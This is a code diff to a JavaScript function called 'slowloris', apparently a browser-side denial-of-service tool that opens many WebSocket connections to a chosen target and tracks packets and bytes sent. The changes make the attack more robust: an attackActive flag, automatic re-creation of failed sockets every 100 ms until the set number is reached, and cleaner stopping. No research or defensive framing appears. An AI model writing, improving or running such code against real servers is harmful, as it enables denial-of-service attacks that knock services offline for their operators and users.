@@ -13,6 +13,7 @@ function slowloris(target, numSockets, statsCallback) {
     let mbps = 0;
     let bytesSent = 0;
     let statsInterval;
+    let attackActive = true;
 
     try {
         const parsedTarget = new URL(target);
@@ -44,6 +45,7 @@ function slowloris(target, numSockets, statsCallback) {
         statsInterval = setInterval(updateStats, 1000);
 
         function createSocket(hostname, port, index, isSecure, path) {
+            if (!attackActive) return;
             let socket;
             try {
                 const protocol = isSecure ? 'wss://' : 'ws://';
@@ -86,6 +88,11 @@ function slowloris(target, numSockets, statsCallback) {
 
             } catch (socketError) {
                 console.error(`Error creating socket ${index + 1}:`, socketError.message);
+                removeSocket(socket);
+            } finally {
+                 if (attackActive && sockets.length < numSockets) {
+                    setTimeout(() => createSocket(hostname, port, index, isSecure, path), 100);
+                }
             }
         }
 
@@ -101,9 +108,13 @@ function slowloris(target, numSockets, statsCallback) {
 
         function sendMessage(socket, message) {
              try {
-                socket.send(message);
-                packetsSent++;
-                bytesSent += message.length;
+                if (socket.readyState === WebSocket.OPEN) {
+                    socket.send(message);
+                    packetsSent++;
+                    bytesSent += message.length;
+                } else {
+                    closeSocket(socket);
+                }
             } catch (error) {
                 console.error("Error sending message:", error.message);
                 closeSocket(socket);
@@ -137,6 +148,7 @@ function slowloris(target, numSockets, statsCallback) {
 
     return {
         stop: () => {
+            attackActive = false;
             sockets.forEach(socket => {
                 closeSocket(socket);
             });
